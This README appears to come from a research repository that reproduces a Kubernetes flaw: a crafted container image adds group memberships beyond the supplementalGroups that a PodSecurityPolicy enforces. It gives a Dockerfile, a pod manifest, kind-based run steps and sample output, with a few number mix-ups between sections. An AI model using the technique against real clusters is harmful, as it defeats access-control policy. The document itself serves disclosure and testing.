# Reproduction code: bypassing supplementalGroups by container image

## What is this?

This is a tiny reproduction code which docker image can bypass PodSecurityContext.SupplementalGroups. This behavior may break PSP(or other policy engine)'s expectation.

Suppose a PSP is enforced in a specific namespace:

```yaml
kind: PodSecurityPolicy
...
spec:
  runAsUser:
    ranges: { min: 1000, max: 1000 }
    rule: MustRunAs
  runAsGroup:
    ranges: { min: 1000, max: 1000 }
    rule: MustRunAs
  supplementalGroups:
    ranges: { min: 60000, max: 60000 }
    rule: MustRunAs
```

User can create a pod that is allowed by the PSP. But it can bypass `supplementalGroups` setting by crafting container image. See the next chapter for details.

```yaml
kind: Pod
...
spec:
  # the securityContext satisfies the above PSP
  securityContext:
    runAsUser: 1000
    runAsGroup: 1000
    supplementalGroups: [50000]
  containers:
  # However, if uid=1000 belongs to gid=60000 in the image,
  # the actual group of the process is groups=50000,60000 (bypassed)
  # although PSP enforces supplementalGroups=60000,
  - image: crafted 
...
```

## How to reproduce

### requirements

- docker
- kind
- kubectl

### Run

```shell
$ git clone -b reproduce-bypass-supplementalgroups https://github.com/pfnet-research/strict-supplementalgroups-container-runtime.git reproduce-bypass-supplementalgroups
$ cd reproduce-bypass-supplementalgroups
```

```
# this takes a several minutes.

# run with containerd
$ ./run.sh 

# run with cri-o
$ MODE=cri-o ./run.sh
```

## Result

```
$ ./run.sh
reproducing bypass supplementalGroups by docker image...

===========================================================================
versions
===========================================================================
kind version
kind v0.15.0 go1.19 darwin/arm64

containerd version
containerd github.com/containerd/containerd v1.6.8 9cd3357b7fd7218e4aec3eae239db1f68a5a6ec6

kubectl version
Client Version: v1.24.6
Kustomize Version: v4.5.4
Server Version: v1.25.2

OS version
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.1 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux reproduce-bypass-supplementalgroups-control-plane 5.10.104-linuxkit #1 SMP PREEMPT Thu Mar 17 17:05:54 UTC 2022 aarch64 aarch64 aarch64 GNU/Linux

===========================================================================
bypass-supplementalgroups-pod manifest
  supplementalGroups: [60000]
===========================================================================
apiVersion: v1
kind: Pod
metadata:
  name: bypass-supplementalgroups-pod
spec:
  # please assume the securityContext fields are restricted by PSP
  securityContext:
    runAsUser: 1000 # alice's uid
    runAsGroup: 1000 # alice's gid
    supplementalGroups: [60000]
  restartPolicy: Never
  containers:
  - image: bypass-supplementalgroups-image
    name: main
    command: ["bash", "-c", "id; true"]
    imagePullPolicy: Never

===========================================================================
Dockerfile of bypass-supplementalgroups-image
  alice(uid=10000) belongs to bypassed-group(gid=50000)
===========================================================================
FROM ubuntu:22.04
RUN groupadd -g 50000 bypassed-group \
    && useradd -m -u 1000 alice \
    && gpasswd -a alice bypassed-group

===========================================================================
Actuall groups of bypass-supplementalgroups-pod's are bypassed supplementalGroups
  alice(uid=1000) can belong to both 
  - 50000(bypassed: NOT IN supplementalGroups, but in container image
  - 60000(in supplementalGroups)
===========================================================================
uid=1000(alice) gid=1000(alice) groups=1000(alice),50000(bypassed-group),60000
```

## Cleanup

```
kind delete cluster --name=reproduce-bypass-supplementalgroups
```
